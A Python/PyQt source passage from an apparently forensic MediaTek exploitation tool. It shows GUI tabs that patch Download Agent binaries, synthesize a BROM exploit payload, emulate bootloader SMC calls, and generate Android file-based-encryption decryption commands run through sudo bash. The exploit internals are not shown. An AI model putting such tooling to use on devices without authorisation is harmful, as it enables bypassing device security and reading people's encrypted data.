            da_grp.setStyleSheet("QGroupBox{color:#ff6060;}")
            da_l = QHBoxLayout(da_grp)
            self.da_path_edit = QLineEdit()
            self.da_path_edit.setPlaceholderText("Path to MTK_AllInOne_DA.bin ...")
            self.da_path_edit.setStyleSheet("background:#1c0c0c;color:#ff8080;border:1px solid #4a1a1a;")
            da_l.addWidget(self.da_path_edit, stretch=1)
            da_browse = QPushButton("Browse DA")
            da_browse.setStyleSheet("background:#2a0a0a;color:#ff8080;border:1px solid #4a1a1a;")
            da_browse.clicked.connect(self._on_browse_da)
            da_l.addWidget(da_browse)
            self.patch_da_btn = QPushButton("🔥 Patch DA")
            self.patch_da_btn.setStyleSheet("background:#3a0a0a;color:#ff4040;font-weight:bold;border:1px solid #5a1a1a;")
            self.patch_da_btn.clicked.connect(self._on_patch_da)
            da_l.addWidget(self.patch_da_btn)
            root.addWidget(da_grp)

            # ── Row 2: Synthesize BROM ────────────────────────────────────────
            syn_grp = QGroupBox("2. Payload Synthesizer (Dynamic ROP)")
            syn_grp.setStyleSheet("QGroupBox{color:#ff6060;}")
            syn_l = QHBoxLayout(syn_grp)
            syn_l.addWidget(QLabel("hw_code:"))
            self.hw_code_edit = QLineEdit()
            self.hw_code_edit.setPlaceholderText("0x766 (MT6765), 0x878 (MT6877), 0x989 (MT6789) ...")
            self.hw_code_edit.setMaximumWidth(200)
            self.hw_code_edit.setStyleSheet("background:#1c0c0c;color:#ff8080;border:1px solid #4a1a1a;")
            syn_l.addWidget(self.hw_code_edit)
            syn_l.addWidget(QLabel("arch:"))
            self.arch_combo = QComboBox()
            self.arch_combo.addItems(["AUTO", "ARM64", "ARM32"])
            self.arch_combo.setStyleSheet("background:#1c0c0c;color:#ff8080;border:1px solid #4a1a1a;")
            syn_l.addWidget(self.arch_combo)
            self.syn_btn = QPushButton("⚡ Synthesize BROM Payload")
            self.syn_btn.setStyleSheet("background:#3a0a0a;color:#ff4040;font-weight:bold;border:1px solid #5a1a1a;")
            self.syn_btn.clicked.connect(self._on_synthesize)
            syn_l.addWidget(self.syn_btn)
            syn_l.addStretch()
            root.addWidget(syn_grp)

            # ── Row 3: Emulate LK ────────────────────────────────────────────
            emu_grp = QGroupBox("3. Micro-Emulator TEE (Unicorn SMC Trap)")
            emu_grp.setStyleSheet("QGroupBox{color:#ff6060;}")
            emu_l = QHBoxLayout(emu_grp)
            emu_l.addWidget(QLabel("lk.bin:"))
            self.lk_path_edit = QLineEdit()
            self.lk_path_edit.setPlaceholderText("Path to lk.bin ...")
            self.lk_path_edit.setStyleSheet("background:#1c0c0c;color:#ff8080;border:1px solid #4a1a1a;")
            emu_l.addWidget(self.lk_path_edit, stretch=1)
            lk_browse = QPushButton("Browse LK")
            lk_browse.setStyleSheet("background:#2a0a0a;color:#ff8080;border:1px solid #4a1a1a;")
            lk_browse.clicked.connect(self._on_browse_lk)
            emu_l.addWidget(lk_browse)
            emu_l.addWidget(QLabel("SRAM base:"))
            self.sram_edit = QLineEdit("0x00110000")
            self.sram_edit.setMaximumWidth(120)
            self.sram_edit.setStyleSheet("background:#1c0c0c;color:#ff8080;border:1px solid #4a1a1a;")
            emu_l.addWidget(self.sram_edit)
            self.emu_btn = QPushButton("🎯 Emulate & Trap SMC")
            self.emu_btn.setStyleSheet("background:#3a0a0a;color:#ff4040;font-weight:bold;border:1px solid #5a1a1a;")
            self.emu_btn.clicked.connect(self._on_emulate)
            emu_l.addWidget(self.emu_btn)
            root.addWidget(emu_grp)

            # ── Console Output ──────────────────────────────────────────────
            self.arsenal_console = QTextEdit()
            self.arsenal_console.setReadOnly(True)
            self.arsenal_console.setFont(QFont("Consolas", 10))
            self.arsenal_console.setStyleSheet("background:#0f0505;color:#ff9090;border:1px solid #3a0a0a;")
            self.arsenal_console.setPlaceholderText("Arsenal console ready...\nSelect a weapon.")
            root.addWidget(self.arsenal_console, stretch=1)

            # Status bar inside tab
            self.arsenal_status = QLabel("Ready")
            self.arsenal_status.setStyleSheet("color:#804040;font-size:11px;")
            root.addWidget(self.arsenal_status)

            # Workers
            self._patch_worker   = None
            self._syn_worker     = None
            self._emu_worker     = None

        # ── Helpers ─────────────────────────────────────────────────────────
        def _append(self, text: str):
            self.arsenal_console.append(text)

        def _set_status(self, text: str, color: str = "#ff6060"):
            self.arsenal_status.setText(text)
            self.arsenal_status.setStyleSheet(f"color:{color};font-size:11px;")

        def _on_browse_da(self):
            fp, _ = QFileDialog.getOpenFileName(self, "Open DA Binary", str(Path.home()),
                                                "Binary files (*.bin *.da);;All Files (*)")
            if fp:
                self.da_path_edit.setText(fp)

        def _on_browse_lk(self):
            fp, _ = QFileDialog.getOpenFileName(self, "Open LK Binary", str(Path.home()),
                                                "Binary files (*.bin);;All Files (*)")
            if fp:
                self.lk_path_edit.setText(fp)

        # ── Patch DA ────────────────────────────────────────────────────────
        def _on_patch_da(self):
            path = self.da_path_edit.text().strip()
            if not path or not os.path.isfile(path):
                self._append("[ERROR] Select a valid DA binary first.")
                return
            self._set_status("Patching DA...")
            self._append(f"\n{'─'*68}\n  🔥 DA PATCH ENGINE — Frankenstein Mode\n{'─'*68}")
            self.patch_da_btn.setEnabled(False)
            self._patch_worker = ArsenalPatchDAWorker(path)
            self._patch_worker.finished.connect(self._on_patch_da_done)
            self._patch_worker.error.connect(self._on_patch_da_error)
            self._patch_worker.start()

        def _on_patch_da_done(self, res: dict):
            self.patch_da_btn.setEnabled(True)
            self._set_status(f"Done — {res.get('patches_applied',0)} patch(es)", "#ff6060")
            self._append(f"  Status    : {res['status']}")
            self._append(f"  Arch      : {res.get('detected_arch','?')}")
            self._append(f"  Patches   : {res['patches_applied']}")
            for p in res.get("patch_offsets", []):
                self._append(f"    offset={p['offset']}  string={p['string']}  arch={p['arch']}  patch={p['patch_hex']}")
            if res.get("warnings"):
                for w in res["warnings"]:
                    self._append(f"  ⚠ {w}")
            # Offer to save patched DA
            if res.get("patched_data") and res["patches_applied"] > 0:
                save, _ = QFileDialog.getSaveFileName(self, "Save Patched DA", str(Path.home()),
                                                       "Binary files (*.bin)")
                if save:
                    Path(save).write_bytes(res["patched_data"])
                    self._append(f"  ✓ Saved patched DA to {save}")

        def _on_patch_da_error(self, msg: str):
            self.patch_da_btn.setEnabled(True)
            self._set_status("Patch failed", "#ff0000")
            self._append(f"[ERROR] {msg}")

        # ── Synthesize BROM ───────────────────────────────────────────────
        def _on_synthesize(self):
            hw_str = self.hw_code_edit.text().strip()
            if not hw_str:
                self._append("[ERROR] Enter hw_code (e.g. 0x766).")
                return
            try:
                hw_code = int(hw_str, 16)
            except ValueError:
                self._append("[ERROR] hw_code must be hex (e.g. 0x766).")
                return
            arch = self.arch_combo.currentText()
            self._set_status("Synthesizing payload...")
            self._append(f"\n{'─'*68}\n  ⚡ PAYLOAD SYNTHESIZER — Dynamic ROP\n{'─'*68}")
            self.syn_btn.setEnabled(False)
            self._syn_worker = ArsenalSynthesizeWorker(hw_code, arch, self._hcm)
            self._syn_worker.finished.connect(self._on_synthesize_done)
            self._syn_worker.error.connect(self._on_synthesize_error)
            self._syn_worker.start()

        def _on_synthesize_done(self, res: dict):
            self.syn_btn.setEnabled(True)
            self._set_status(f"Payload synthesized ({res['payload_len']} bytes)", "#ff6060")
            self._append(f"  hw_code  : {res['hw_code']}")
            self._append(f"  arch     : {res['arch']}")
            self._append(f"  SRAM     : {res.get('target_sram','?')}")
            self._append(f"  payload  : {res['payload_len']} bytes")
            self._append(f"  hex      : {res['payload_hex'][:80]}…")
            if res.get("watchdog_write"):
                wd = res["watchdog_write"]
                self._append(f"  watchdog : addr={wd['address']}  value={wd['value']}")
            if res.get("notes"):
                for n in res["notes"]:
                    self._append(f"  → {n}")
            # Save payload
            save, _ = QFileDialog.getSaveFileName(self, "Save Payload", str(Path.home()),
                                                   "Binary files (*.bin)")
            if save:
                Path(save).write_bytes(bytes.fromhex(res["payload_hex"]))
                self._append(f"  ✓ Saved payload to {save}")

        def _on_synthesize_error(self, msg: str):
            self.syn_btn.setEnabled(True)
            self._set_status("Synthesis failed", "#ff0000")
            self._append(f"[ERROR] {msg}")

        # ── Emulate LK ──────────────────────────────────────────────────────
        def _on_emulate(self):
            path = self.lk_path_edit.text().strip()
            if not path or not os.path.isfile(path):
                self._append("[ERROR] Select a valid lk.bin first.")
                return
            try:
                sram_base = int(self.sram_edit.text().strip(), 16)
            except ValueError:
                self._append("[ERROR] SRAM base must be hex (e.g. 0x00110000).")
                return
            self._set_status("Emulating LK...")
            self._append(f"\n{'─'*68}\n  🎯 MICRO-EMULATOR TEE — Unicorn SMC Trap\n{'─'*68}")
            self.emu_btn.setEnabled(False)
            self._emu_worker = ArsenalEmulateWorker(path, sram_base, self._hcm)
            self._emu_worker.finished.connect(self._on_emulate_done)
            self._emu_worker.error.connect(self._on_emulate_error)
            self._emu_worker.start()

        def _on_emulate_done(self, res: dict):
            self.emu_btn.setEnabled(True)
            self._set_status(f"Emulation done — {res['status']}", "#ff6060")
            self._append(f"  emulator : {res['emulator']}")
            self._append(f"  status   : {res['status']}")
            if res.get("smc_offset") is not None:
                self._append(f"  SMC offset : 0x{res['smc_offset']:08X}")
                self._append(f"  SMC PC     : {res.get('smc_pc','?')}")
                if res.get("registers"):
                    self._append("  Registers at trap:")
                    for r, v in res["registers"].items():
                        self._append(f"    {r}: {v}")
                if res.get("hook_patch"):
                    hp = res["hook_patch"]
                    self._append(f"  Hook SRAM  : {hp.get('hook_sram_addr','?')}")
                    self._append("  BROM WRITE32 sequence:")
                    for cmd in hp.get("brom_write32_sequence", []):
                        self._append(f"    {cmd}")
                    if hp.get("note"):
                        self._append(f"  Note: {hp['note']}")
            if res.get("warnings"):
                for w in res["warnings"]:
                    self._append(f"  ⚠ {w}")
            if res.get("notes"):
                for n in res["notes"]:
                    self._append(f"  → {n}")

        def _on_emulate_error(self, msg: str):
            self.emu_btn.setEnabled(True)
            self._set_status("Emulation failed", "#ff0000")
            self._append(f"[ERROR] {msg}")

    # ── Arsenal Worker Threads ────────────────────────────────────────────
    class ArsenalPatchDAWorker(QThread):
        finished = pyqtSignal(dict)
        error    = pyqtSignal(str)

        def __init__(self, path: str):
            super().__init__()
            self.path = path

        def run(self):
            data = None
            try:
                # v13.0: mmap instead of read_bytes() — EAFP for block devices
                with open(self.path, "rb") as f:
                    try:
                        data = mmap.mmap(f.fileno(), _get_real_size(f.fileno()), access=mmap.ACCESS_READ)
                    except ValueError as e:
                        if "empty file" in str(e).lower():
                            self.error.emit("FILE_EMPTY — cannot patch empty dump.")
                            return
                        raise
                    res = OmniMTK_Weaponizer.DAPatcherEngine.patch_da(data, arch="AUTO")
                self.finished.emit(res)
            except Exception as e:
                self.error.emit(str(e))
            finally:
                if data is not None:
                    del res
                    gc.collect()
                    data.close()

    class ArsenalSynthesizeWorker(QThread):
        finished = pyqtSignal(dict)
        error    = pyqtSignal(str)

        def __init__(self, hw_code: int, arch: str,
                     hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            self.hw_code = hw_code
            self.arch    = arch
            self.hcm     = hcm

        def run(self):
            try:
                res = OmniMTK_Weaponizer.PayloadSynthesizer.generate_brom_exploit(
                    self.hw_code, self.arch, hcm=self.hcm
                )
                self.finished.emit(res)
            except Exception as e:
                self.error.emit(str(e))

    class ArsenalEmulateWorker(QThread):
        finished = pyqtSignal(dict)
        error    = pyqtSignal(str)

        def __init__(self, path: str, sram_base: int,
                     hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            self.path      = path
            self.sram_base = sram_base
            self.hcm       = hcm

        def run(self):
            data = None
            try:
                # v13.0: mmap instead of read_bytes() — EAFP for block devices
                with open(self.path, "rb") as f:
                    try:
                        data = mmap.mmap(f.fileno(), _get_real_size(f.fileno()), access=mmap.ACCESS_READ)
                    except ValueError as e:
                        if "empty file" in str(e).lower():
                            self.error.emit("FILE_EMPTY — cannot emulate empty dump.")
                            return
                        raise
                    res = OmniMTK_Weaponizer.ShadowTEE_Engine.emulate_and_trap_smc(
                        data, self.sram_base, max_steps=50000, hcm=self.hcm
                    )
                self.finished.emit(res)
            except Exception as e:
                self.error.emit(str(e))
            finally:
                if data is not None:
                    del res
                    gc.collect()
                    data.close()

    class DecryptionTab(QWidget):
        """
        v11.4 — 🔓 Decryption & Mount: Forensic FBE Command Generator.
        Pulls extracted CE/DE keys from prior analysis and generates
        ready-to-execute Linux/WSL terminal commands for decrypting
        and mounting a raw F2FS userdata image.
        """
        def __init__(self, result_getter=None, on_ready=None, forensic_journal=None,
                     hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            # result_getter: callable that returns the latest _last_result dict
            self._result_getter = result_getter
            # on_ready: callback invoked when commands are successfully generated
            self._on_ready = on_ready
            # forensic_journal: append-only evidence log for court traceability
            self._forensic_journal = forensic_journal
            # hcm: Hardware Capability Matrix — blocks impossible decryption
            self._hcm = hcm if hcm is not None else HardwareCapabilityMatrix()
            self._last_cmd_set: dict = {}

            root = QVBoxLayout(self)
            root.setContentsMargins(6, 6, 6, 6)
            root.setSpacing(6)

            hdr = QLabel("  🔓  DECRYPTION & MOUNT — Android FBE Forensic Workflow  v12.4")
            hdr.setFont(QFont("Consolas", 12, QFont.Weight.Bold))
            hdr.setStyleSheet("color:#60ff80;background:#0a1a0a;padding:6px;border-radius:4px;")
            root.addWidget(hdr)

            # ── Key Source Row ────────────────────────────────────────────
            key_grp = QGroupBox("1. Extracted Keys (auto-pulled from analysis)")
            key_grp.setStyleSheet("QGroupBox{color:#60ff80;}")
            kg = QGridLayout(key_grp)
            kg.setSpacing(8)

            self.ce_edit = QLineEdit()
            self.ce_edit.setPlaceholderText("CE Key hex (64 B = 128 hex chars) — auto-filled from analysis")
            self.ce_edit.setStyleSheet("background:#0a1a0a;color:#60ff80;border:1px solid #2a5a2a;font-family:Consolas;")
            kg.addWidget(QLabel("CE Key:"), 0, 0)
            kg.addWidget(self.ce_edit, 0, 1)

            self.de_edit = QLineEdit()
            self.de_edit.setPlaceholderText("DE Key hex (64 B = 128 hex chars) — auto-filled from analysis")
            self.de_edit.setStyleSheet("background:#0a1a0a;color:#60ff80;border:1px solid #2a5a2a;font-family:Consolas;")
            kg.addWidget(QLabel("DE Key:"), 1, 0)
            kg.addWidget(self.de_edit, 1, 1)

            self.meta_edit = QLineEdit()
            self.meta_edit.setPlaceholderText("Metadata Key hex (optional — for dm-default-key)")
            self.meta_edit.setStyleSheet("background:#0a1a0a;color:#60ff80;border:1px solid #2a5a2a;font-family:Consolas;")
            kg.addWidget(QLabel("Meta Key:"), 2, 0)
            kg.addWidget(self.meta_edit, 2, 1)

            self.pull_keys_btn = QPushButton("⟳ Pull Keys from Last Analysis")
            self.pull_keys_btn.setStyleSheet("background:#1a3a1a;color:#60ff80;border:1px solid #2a5a2a;")
            self.pull_keys_btn.clicked.connect(self._on_pull_keys)
            kg.addWidget(self.pull_keys_btn, 3, 1)
            root.addWidget(key_grp)

            # ── Image Source Row ──────────────────────────────────────────
            img_grp = QGroupBox("2. Userdata Image (raw F2FS dump)")
            img_grp.setStyleSheet("QGroupBox{color:#60ff80;}")
            img_l = QHBoxLayout(img_grp)
            self.img_edit = QLineEdit()
            self.img_edit.setPlaceholderText("Path to userdata.img / userdata.bin ...")
            self.img_edit.setStyleSheet("background:#0a1a0a;color:#60ff80;border:1px solid #2a5a2a;")
            img_l.addWidget(self.img_edit, stretch=1)
            img_browse = QPushButton("Browse Image")
            img_browse.setStyleSheet("background:#1a3a1a;color:#60ff80;border:1px solid #2a5a2a;")
            img_browse.clicked.connect(self._on_browse_image)
            img_l.addWidget(img_browse)
            root.addWidget(img_grp)

            # ── HCM Cryptographic Reality Warning ─────────────────────────
            self._hcm_warn = QLabel("")
            self._hcm_warn.setFont(QFont("Consolas", 11, QFont.Weight.Bold))
            self._hcm_warn.setStyleSheet(
                "color:#ff2020;background:#2a0a0a;border:2px solid #ff4040;padding:8px;border-radius:4px;"
            )
            self._hcm_warn.setWordWrap(True)
            self._hcm_warn.hide()
            root.addWidget(self._hcm_warn)

            # ── Workflow & Generate ─────────────────────────────────────
            action_bar = QHBoxLayout()
            self.gen_btn = QPushButton("⚡ Generate Forensic Commands")
            self.gen_btn.setStyleSheet(
                "background:#1a3a1a;color:#60ff80;font-weight:bold;border:1px solid #2a5a2a;padding:8px;"
            )
            self.gen_btn.clicked.connect(self._on_generate)
            action_bar.addWidget(self.gen_btn)

            self.copy_btn = QPushButton("📋 Copy All to Clipboard")
            self.copy_btn.setStyleSheet("background:#1a3a1a;color:#60ff80;border:1px solid #2a5a2a;")
            self.copy_btn.clicked.connect(self._on_copy)
            self.copy_btn.setEnabled(False)
            action_bar.addWidget(self.copy_btn)

            self.exec_btn = QPushButton("▶️ Execute Live in Terminal (RAM Only)")
            self.exec_btn.setStyleSheet(
                "background:#1a3a1a;color:#60ff80;font-weight:bold;border:1px solid #2a5a2a;padding:8px;"
            )
            self.exec_btn.clicked.connect(self._on_live_execute)
            self.exec_btn.setEnabled(False)
            self.exec_btn.setToolTip(
                "v11.4 OPSEC: Executes the generated script via subprocess.Popen "
                "piping it directly to sudo bash stdin. Keys NEVER touch disk."
            )
            action_bar.addWidget(self.exec_btn)

            # v12.4: Explicit disk-write only on user request — absolute zero disk trace
            self.export_btn = QPushButton("💾 Export Standalone Script")
            self.export_btn.setStyleSheet(
                "background:#1a1a3a;color:#8080ff;border:1px solid #2a2a5a;padding:8px;"
            )
            self.export_btn.clicked.connect(self._on_export_script)
            self.export_btn.setEnabled(False)
            self.export_btn.setToolTip(
                "v12.4 OPSEC: ONLY writes the standalone bash script to disk when clicked."
            )
            action_bar.addWidget(self.export_btn)

            action_bar.addStretch()
            root.addLayout(action_bar)

            # ── Status / Workflow ───────────────────────────────────────
            self.status_lbl = QLabel("Ready — pull keys or enter manually, then browse image and generate.")
            self.status_lbl.setStyleSheet("color:#808080;font-size:11px;padding:4px;")
            root.addWidget(self.status_lbl)

            # Initial HCM enforcement check
            self._update_hcm_warning()

            # ── Console Output ────────────────────────────────────────────
            self.decrypt_console = QTextEdit()
            self.decrypt_console.setReadOnly(True)
            self.decrypt_console.setFont(QFont("Consolas", 10))
            self.decrypt_console.setStyleSheet("background:#0a0a0a;color:#d0ffd0;border:1px solid #2a3a2a;")
            self.decrypt_console.setPlaceholderText(
                "Forensic commands will appear here step-by-step.\n"
                "Review every command before pasting into a root terminal or WSL session.\n"
                "⚠️  Keys are injected into the kernel keyring — handle with extreme care."
            )
            root.addWidget(self.decrypt_console, stretch=1)

        # ── Helpers ───────────────────────────────────────────────────
        def _append(self, text: str):
            self.decrypt_console.append(text)

        def _set_status(self, text: str, color: str = "#60ff80"):
            self.status_lbl.setText(text)
            self.status_lbl.setStyleSheet(f"color:{color};font-size:11px;padding:4px;")

        def _update_hcm_warning(self) -> bool:
            """v13.0 — ONLY blocks when HCM proves hardware-wrapped keys exist.
            Does NOT check chip_id, tee_type, fbe_version, is_ready(), or ANY
            other HCM field. Pure offline decryption (image + keys, no device)
            must NEVER be blocked by missing hardware context.
            Returns True if buttons were forcibly disabled (blocking active)."""
            if self._hcm.hardware_wrapped_keys:
                self._hcm_warn.setText(
                    "CRITICAL: Hardware-Wrapped Keys Detected.\n"
                    "Offline FBE decryption is physically impossible without the SoC Inline Crypto Engine.\n"
                    "Keys must be unwrapped via TrustZone emulation."
                )
                self._hcm_warn.show()
                self.gen_btn.setEnabled(False)
                self.copy_btn.setEnabled(False)
                self.exec_btn.setEnabled(False)
                self.export_btn.setEnabled(False)
                self._set_status(
                    "FBE Decryption BLOCKED — Hardware-wrapped keys require TZ emulation.", "#ff4040"
                )
                return True
            else:
                self._hcm_warn.hide()
                return False

        def _on_browse_image(self):
            fp, _ = QFileDialog.getOpenFileName(
                self, "Open Userdata Image", str(Path.home()),
                "Image files (*.img *.bin *.dump);;All Files (*)"
            )
            if fp:
                self.img_edit.setText(fp)
                # v12.0: Log image load to Forensic Journal with SHA-256
                if self._forensic_journal is not None:
                    try:
                        with open(fp, "rb") as _fh:
                            data = mmap.mmap(_fh.fileno(), _get_real_size(_fh.fileno()), access=mmap.ACCESS_READ)
                            try:
                                sample = bytes(data[:65536])  # hash first 64KB
                                self._forensic_journal.record(
                                    event_type="IMAGE_LOAD",
                                    file_path=fp,
                                    data=sample,
                                    notes=f"Userdata image for FBE decryption  |  Full size: {len(data):,} bytes"
                                )
                            finally:
                                del sample
                                gc.collect()
                                data.close()
                    except ValueError as e:
                        if "empty file" in str(e).lower():
                            print(f"[WARN] FILE_EMPTY userdata image: {fp}", file=sys.stderr)
                        else:
                            print(f"[WARN] Forensic journal IMAGE_LOG failed: {e}", file=sys.stderr)
                    except Exception as e:
                        print(f"[WARN] Forensic journal IMAGE_LOG failed: {e}", file=sys.stderr)

        def _on_pull_keys(self):
            if self._result_getter is None:
                self._set_status("No analysis result source connected.", "#ff6060")
                return
            result = self._result_getter()
            if not result:
                self._set_status("No analysis results available. Run 'Derive Keys' or 'Analyze Samsung Log' first.", "#ff6060")
                return

            ce_found = False
            de_found = False

            # Search common key names in _last_result
            for k, v in result.items():
                if not isinstance(v, str):
                    continue
                v_stripped = v.strip().replace(" ", "").replace("0x", "")
                if len(v_stripped) == 128 and all(c in "0123456789abcdefABCDEF" for c in v_stripped):
                    # Heuristic: 128 hex chars = 64 bytes = AES-256-XTS key size
                    if "ce" in k.lower() and "key" in k.lower():
                        self.ce_edit.setText(v_stripped)
                        ce_found = True
                    elif "de" in k.lower() and "key" in k.lower():
                        self.de_edit.setText(v_stripped)
                        de_found = True
                    elif "fscrypt" in k.lower() and not ce_found:
                        self.ce_edit.setText(v_stripped)
                        ce_found = True
                    elif "key" in k.lower() and not self.ce_edit.text():
                        self.ce_edit.setText(v_stripped)
                        ce_found = True
                    elif "key" in k.lower() and not self.de_edit.text():
                        self.de_edit.setText(v_stripped)
                        de_found = True

            status_parts = []
            if ce_found:
                status_parts.append("CE Key auto-filled")
            if de_found:
                status_parts.append("DE Key auto-filled")
            if status_parts:
                self._set_status("  |  ".join(status_parts) + " — review and browse image.", "#60ff80")
            else:
                self._set_status("No 128-char hex keys found in last analysis. Enter manually.", "#ff6060")

        def _sanitize_hex_input(self, raw: str, label: str) -> str:
            """v11.4: aggressively strip whitespace, hyphens, colons, 0x prefixes.
            Returns cleaned hex string or empty string if invalid."""
            if not raw:
                return ""
            cleaned = raw.strip()
            for ch in (" ", "\t", "\n", "\r", "-", ":", "0x"):
                cleaned = cleaned.replace(ch, "")
            if not cleaned:
                return ""
            if not all(c in "0123456789abcdefABCDEF" for c in cleaned):
                self._append(f"[ERROR] {label} contains non-hex characters after sanitization.")
                return ""
            return cleaned

        def _on_generate(self):
            img = self.img_edit.text().strip()
            # v11.4 FIX: sanitize hex inputs BEFORE passing to engine
            ce = self._sanitize_hex_input(self.ce_edit.text(), "CE Key")
            de = self._sanitize_hex_input(self.de_edit.text(), "DE Key")
            meta = self._sanitize_hex_input(self.meta_edit.text(), "Metadata Key")

            # v11.4: update GUI fields with cleaned values so the analyst sees what was used
            if ce:
                self.ce_edit.setText(ce)
            if de:
                self.de_edit.setText(de)
            if meta:
                self.meta_edit.setText(meta)

            if not img:
                self._set_status("Browse for a userdata image first.", "#ff6060")
                return

            # v11.4 FIX: explicit length validation for FBE keys (128 hex chars = 64 bytes)
            if ce and len(ce) != 128:
                self._set_status(f"CE Key must be exactly 128 hex chars (64 bytes), got {len(ce)}.", "#ff6060")
                self._append(f"[ERROR] CE Key length invalid: {len(ce)} chars (expected 128).")
                return
            if de and len(de) != 128:
                self._set_status(f"DE Key must be exactly 128 hex chars (64 bytes), got {len(de)}.", "#ff6060")
                self._append(f"[ERROR] DE Key length invalid: {len(de)} chars (expected 128).")
                return
            if meta and len(meta) not in (32, 64, 128):
                self._set_status(f"Metadata Key length unusual: {len(meta)} chars.", "#ffaa00")

            self.decrypt_console.clear()
            self._append(f"{'='*72}")
            self._append("  OmniMTK v11.4 — Android FBE Forensic Decryption Command Set")
            self._append(f"{'='*72}")
            self._append("")

            cmd_set = AndroidFBEDecryptor.build_command_set(
                image_path=img,
                ce_key_hex=ce,
                de_key_hex=de,
                metadata_key_hex=meta,
            )
            self._last_cmd_set = cmd_set

            status = cmd_set.get("status", "UNKNOWN")
            if status == "ERROR":
                self._set_status(f"ERROR: {' | '.join(cmd_set['warnings'])}", "#ff0000")
                for w in cmd_set["warnings"]:
                    self._append(f"[ERROR] {w}")
                return

            self._set_status(
                f"Status: {status}  |  CE: {'OK' if cmd_set['ce_key_valid'] else 'MISSING'}  "
                f"|  DE: {'OK' if cmd_set['de_key_valid'] else 'MISSING'}",
                "#60ff80" if status == "READY" else ("#ffaa00" if status == "PARTIAL" else "#ff6060")
            )

            if cmd_set["warnings"]:
                self._append("⚠️  WARNINGS:")
                for w in cmd_set["warnings"]:
                    self._append(f"    • {w}")
                self._append("")

            self._append("📋 FORENSIC WORKFLOW (copy each block to root terminal):")
            self._append("")
            for c in cmd_set["commands"]:
                risky_tag = "  ⚠️ RISKY" if c["risky"] else ""
                self._append(f"# Step {c['step']}: {c['description']}{risky_tag}")
                self._append(c["command"])
                self._append("")

            self._append("="*72)
            self._append("# 📁 One-Liner Script (paste into bash):")
            self._append(cmd_set.get("one_liner", ""))
            self._append("="*72)

            # v12.0: Notify main window that commands are ready — state machine
            # controls copy/exec enablement, NOT this tab directly.
            if self._on_ready:
                self._on_ready()

        def _on_copy(self):
            if not self._last_cmd_set:
                return
            txt = self._last_cmd_set.get("one_liner", "")
            if txt:
                clipboard = QApplication.clipboard()
                clipboard.setText(txt)
                self._set_status("Commands copied to clipboard. Paste into root terminal.", "#60ff80")

        def _on_export_script(self):
            """v12.4 — Explicit user-initiated disk write ONLY.
            The standalone script lives in RAM until this button is clicked."""
            if not self._last_cmd_set:
                self._set_status("Generate commands first.", "#ff6060")
                return
            script = self._last_cmd_set.get("standalone_script", "")
            if not script:
                script = self._last_cmd_set.get("one_liner", "")
            if not script:
                self._set_status("No script available to export.", "#ff6060")
                return
            fp, _ = QFileDialog.getSaveFileName(
                self, "Export Standalone Script", str(Path.home() / "omnimtk_decrypt.sh"),
                "Shell scripts (*.sh);;All Files (*)"
            )
            if not fp:
                return
            try:
                Path(fp).write_text(script, encoding="utf-8")
                self._set_status(f"Script exported: {Path(fp).name}", "#8080ff")
                self._append(f"\n[INFO] Standalone script exported to: {fp}")
                if self._forensic_journal is not None:
                    self._forensic_journal.record(
                        event_type="SCRIPT_EXPORT",
                        file_path=fp,
                        notes="User-initiated standalone decryption script export (v12.4 OPSEC)"
                    )
            except Exception as e:
                self._set_status(f"Export failed: {e}", "#ff6060")
                self._append(f"\n[ERROR] Failed to export script: {e}")

        # ── v11.4 Live Execution Worker ────────────────────────────────────
        class LiveExecWorker(QThread):
            """v11.4 — Execute the generated bash script via subprocess.Popen
            piping directly to sudo bash stdin. Keys NEVER touch disk.
            Emits stdout lines and completion status back to the GUI.
            """
            output   = pyqtSignal(str)
            finished = pyqtSignal(int)
            error    = pyqtSignal(str)

            def __init__(self, script: str):
                super().__init__()
                self.script = script

            def run(self):
                try:
                    p = subprocess.Popen(
                        ["sudo", "bash"],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                    )
                    out, _ = p.communicate(
                        input=self.script.encode("utf-8"),
                        timeout=300,
                    )
                    for line in out.decode("utf-8", errors="replace").splitlines():
                        self.output.emit(line)
                    self.finished.emit(p.returncode)
                except subprocess.TimeoutExpired:
                    self.error.emit("Live execution timed out after 300 seconds.")
                except Exception as e:
                    self.error.emit(str(e))

        def _on_live_execute(self):
            """v11.4 OPSEC: Execute the one-liner script in-memory via subprocess.
            No disk write. Keys flow only through stdin pipe into kernel keyring."""
            if not self._last_cmd_set:
                self._set_status("Generate commands first.", "#ff6060")
                return
            script = self._last_cmd_set.get("one_liner", "")
            if not script:
                self._set_status("No script generated.", "#ff6060")
                return
            self._append("\n" + "="*72)
            self._append("  ▶️  LIVE EXECUTION STARTED — Keys in RAM only, no disk trace")
            self._append("="*72)
            self.exec_btn.setEnabled(False)
            self._set_status("Executing live in terminal...", "#60ff80")
            self._live_worker = self.LiveExecWorker(script)
            self._live_worker.output.connect(self._on_exec_output)
            self._live_worker.finished.connect(self._on_exec_finished)
            self._live_worker.error.connect(self._on_exec_error)
            self._live_worker.start()

        def _on_exec_output(self, line: str):
            self._append(line)

        def _on_exec_finished(self, return_code: int):
            self.exec_btn.setEnabled(True)
            if return_code == 0:
                self._set_status("Live execution completed successfully.", "#60ff80")
                self._append("\n[INFO] Execution finished with exit code 0")
            else:
                self._set_status(f"Live execution exited with code {return_code}.", "#ff6060")
                self._append(f"\n[WARN] Execution finished with exit code {return_code}")
            if hasattr(self, "_live_worker") and self._live_worker is not None:
                self._live_worker.deleteLater()
                self._live_worker = None

        def _on_exec_error(self, msg: str):
            self.exec_btn.setEnabled(True)
            self._append(f"\n[ERROR] Live execution failed: {msg}")
            self._set_status(f"Live execution error: {msg}", "#ff6060")
            if hasattr(self, "_live_worker") and self._live_worker is not None:
                self._live_worker.deleteLater()
                self._live_worker = None

    class SamsungAnalysisTab(QWidget):
        """
        FEATURE 1-5 + v9.5 Binary Analyzer UI.
        Two sub-tabs:
          Tab 1 — Knox/TEEGRIS analysis (log-based)
          Tab 2 — Binary Sector Analysis (binary dump files)
        """
        def __init__(self, loaded_partitions: dict = None, forensic_journal=None,
                     hcm: HardwareCapabilityMatrix = None):
            super().__init__()
            self._loaded_partitions = loaded_partitions if loaded_partitions is not None else {}
            self._forensic_journal = forensic_journal
            self._hcm = hcm
            root_layout = QVBoxLayout(self)
            root_layout.setContentsMargins(4, 4, 4, 4)
            root_layout.setSpacing(4)

